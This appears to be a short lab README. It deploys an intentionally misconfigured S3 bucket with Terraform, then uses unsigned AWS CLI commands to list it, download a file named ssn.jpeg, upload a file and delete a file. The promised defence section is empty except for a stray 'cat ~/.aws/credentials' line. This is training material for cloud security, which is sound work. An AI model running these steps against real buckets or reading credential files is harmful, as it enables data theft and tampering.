# S3 Misconfiguration

* Clone the repository 

```bash
git clone https://github.com/bvabhishek/s3misconfiguration.git
```
* Step 1: Change Directory

```bash
cd s3misconfiguration
```
* Step : Initialise terraform 

```bash
terraform init
```

* Step : Run `terraform apply -auto-approve`

```bash
terraform apply -auto-approve
```

* Step 4: Export bucket name
```bash
export s3bucket=<bucketname> 
```

* Step 5: Lets try to list down the contents of bucket

```bash
aws s3 ls s3://$s3bucket
```

* Step 6: Now lets perform all the possible attacks

* Step 7: Lets first download the fishy files 

```bash
aws s3 cp s3://$s3bucket/ssn.jpeg /home/abhi/seasides/

```

* Step 8: Let's upload a new file 

```bash
aws s3 cp main.tf s3://$s3bucket --no-sign-request --region us-west-2
```

* Step 9: Let's Delete a file 


```bash
aws s3 rm s3://$s3bucket/output.tf --no-sign-request --region us-west-2
```


* By this we can figure out that all sensitive data has been compromised and due to misconfiguration of bucket we have a complete control of the bucket


Now how to put a control on it or Defend 




cat ~/.aws/credentials
